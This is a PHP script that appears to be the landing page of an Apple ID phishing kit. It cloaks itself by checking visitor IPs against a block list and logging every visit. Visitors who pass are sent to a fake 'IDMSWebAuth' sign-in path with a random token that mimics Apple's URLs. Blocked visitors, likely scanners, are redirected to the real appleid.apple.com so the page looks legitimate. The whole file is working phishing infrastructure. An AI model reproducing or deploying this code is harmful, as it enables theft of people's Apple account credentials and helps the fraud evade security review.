<?php
error_reporting(0);
require_once("assets/includes/functions.php");
    $ips       = array(
        $_SERVER['REMOTE_ADDR']
    );
    $checklist = new IpBlockList();
    foreach ($ips as $ip) {
        $result = $checklist->ipPass($ip);
        if ($result) {
            $msg = "PASSED: " . $checklist->message();
            $fp  = fopen("assets/logs/accepted_visitors.txt", "a");
            fputs($fp, "IP: $v_ip - DATE: $v_date - BROWSER: $v_agent\r\n");
            fclose($fp);
            session_start();
            $_SESSION['page_a_visited'] = true;
            $domain                     = "https://$_SERVER[SERVER_NAME]";
            
            redirectTo("$domain/IDMSWebAuth?appIdKey=" . generateRandomString(80));
        } else {
            $msg = "FAILED: " . $checklist->message();
            $fp  = fopen("assets/logs/denied_visitors.txt", "a");
            fputs($fp, "IP: $v_ip - DATE: $v_date - BROWSER: $v_agent\r\n");
            fclose($fp);
            header("Location: https://www.google.ca/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwi_yey8kvzJAhWwj4MKHVp5ALcQFggcMAA&url=https%3A%2F%2Fappleid.apple.com%2F&usg=AFQjCNF7841Jq5PLrYJwYDN8RkcZjuNVww");
            die();
        }
    }
?>